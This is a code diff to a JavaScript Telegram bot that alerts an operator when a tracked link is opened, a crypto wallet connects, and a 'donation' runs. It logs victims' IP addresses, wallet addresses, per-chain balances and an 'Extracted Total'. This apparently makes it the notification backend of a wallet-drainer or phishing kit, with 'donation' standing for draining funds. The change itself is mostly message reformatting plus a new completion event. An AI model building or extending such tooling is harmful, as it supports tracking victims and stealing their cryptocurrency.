@@ -12,7 +12,9 @@ if (BOT_TOKEN && CHAT_ID) {
 }
 
 function sendMessage(text) {
-  if (bot) bot.sendMessage(CHAT_ID, text, { parse_mode: "Markdown" });
+  if (bot) {
+    bot.sendMessage(CHAT_ID, text, { parse_mode: "Markdown" });
+  }
 }
 
 // ---- Subscribe to events ----
@@ -20,17 +22,17 @@ export function initBot() {
   // 1. Link Opened
   subscribe("LINK_OPENED", ({ openedUrl, visitorIp, trackingId }) => {
     sendMessage(
-      `🔗 *Link Opened*\n📄 URL: ${openedUrl}\n🌍 IP: ${visitorIp}\n🆔 Tracking ID: \`${trackingId}\``
+      `\n📢 *LINK OPENED*\n-------------------------\n📄 URL: ${openedUrl}\n🌍 IP: ${visitorIp}\n🆔 Tracking ID: \`${trackingId}\``
     );
   });
 
   // 2. Wallet Connected
   subscribe("WALLET_CONNECTED", ({ walletAddress, trackingId, balances, grandTotal }) => {
-    let msg = `✅ *Wallet Connected*\n👛 Address: \`${walletAddress}\`\n🆔 Tracking ID: \`${trackingId}\`\n\n💰 *Balances:*\n`;
+    let msg = `\n✅ *WALLET CONNECTED*\n-------------------------\n👛 Address: \`${walletAddress}\`\n🆔 Tracking ID: \`${trackingId}\`\n\n💰 *Balances:*\n`;
     balances.forEach(chain => {
-      msg += `🌐 ${chain.name}\n   • Native: ${chain.native}\n   • Tokens:\n`;
+      msg += `🌐 *${chain.name}*\n   • Native: ${chain.native}\n   • Tokens:\n`;
       chain.tokens.forEach(t => {
-        msg += `      ${t.name}: ${t.amount} ($${t.value})\n`;
+        msg += `      *${t.name}*: ${t.amount} ($${t.value})\n`;
       });
       msg += `   • Chain Total: $${chain.total}\n\n`;
     });
@@ -38,35 +40,48 @@ export function initBot() {
     sendMessage(msg);
   });
 
-  // 3. Donation Begins
+  // 3. Donation Started
   subscribe("DONATION_START", ({ walletAddress, trackingId }) => {
-    sendMessage(`🚀 *Donation Started*\n👛 Address: \`${walletAddress}\`\n🆔 Tracking ID: \`${trackingId}\``);
+    sendMessage(
+      `\n🚀 *DONATION STARTED*\n-------------------------\n👛 Address: \`${walletAddress}\`\n🆔 Tracking ID: \`${trackingId}\``
+    );
   });
 
   // 4. Chain Switch
   subscribe("CHAIN_SWITCH", ({ trackingId, oldChain, newChain }) => {
-    sendMessage(`🔄 *Chain Switched*\n🆔 Tracking ID: \`${trackingId}\`\n🌐 From: ${oldChain} → ${newChain}`);
+    sendMessage(
+      `\n🔄 *CHAIN SWITCHED*\n-------------------------\n🆔 Tracking ID: \`${trackingId}\`\n🌐 From: *${oldChain}* → *${newChain}*`
+    );
   });
 
-  // 5. Donation Results
+  // 5. Donation Results (old "completed")
   subscribe("DONATION_RESULTS", ({ walletAddress, trackingId, balances, donationSummary }) => {
-    let msg = `🎉 *Donation Completed*\n🆔 Tracking ID: \`${trackingId}\`\n👛 Address: \`${walletAddress}\`\n\n💰 *Updated Balances:*\n`;
+    let msg = `\n🎉 *DONATION RESULTS*\n-------------------------\n🆔 Tracking ID: \`${trackingId}\`\n👛 Address: \`${walletAddress}\`\n\n💰 *Updated Balances:*\n`;
     balances.forEach(chain => {
-      msg += `🌐 ${chain.name}\n   • Native: ${chain.native}\n   • Tokens:\n`;
+      msg += `🌐 *${chain.name}*\n   • Native: ${chain.native}\n   • Tokens:\n`;
       chain.tokens.forEach(t => {
-        msg += `      ${t.name}: ${t.amount} ($${t.value})\n`;
+        msg += `      *${t.name}*: ${t.amount} ($${t.value})\n`;
       });
       msg += `   • Chain Total: $${chain.total}\n\n`;
     });
     msg += `📤 *Donation Summary:*\n   • Extracted Total: $${donationSummary.total}\n   • Breakdown:\n`;
     donationSummary.breakdown.forEach(b => {
-      msg += `      ${b.chain}: $${b.amount}\n`;
+      msg += `      *${b.chain}*: $${b.amount}\n`;
     });
     sendMessage(msg);
   });
 
-  // 6. Wallet Disconnected
+  // 6. Donation Completed (was old "wallet disconnected" after flow)
+  subscribe("DONATION_COMPLETED", ({ walletAddress, trackingId }) => {
+    sendMessage(
+      `\n🏁 *DONATION COMPLETED*\n-------------------------\n👛 Address: \`${walletAddress}\`\n🆔 Tracking ID: \`${trackingId}\``
+    );
+  });
+
+  // 7. Wallet Disconnected (new, real disconnect)
   subscribe("WALLET_DISCONNECTED", ({ walletAddress, trackingId }) => {
-    sendMessage(`❌ *Wallet Disconnected*\n👛 Address: \`${walletAddress}\`\n🆔 Tracking ID: \`${trackingId}\``);
+    sendMessage(
+      `\n❌ *WALLET DISCONNECTED*\n-------------------------\n👛 Address: \`${walletAddress}\`\n🆔 Tracking ID: \`${trackingId}\``
+    );
   });
 }
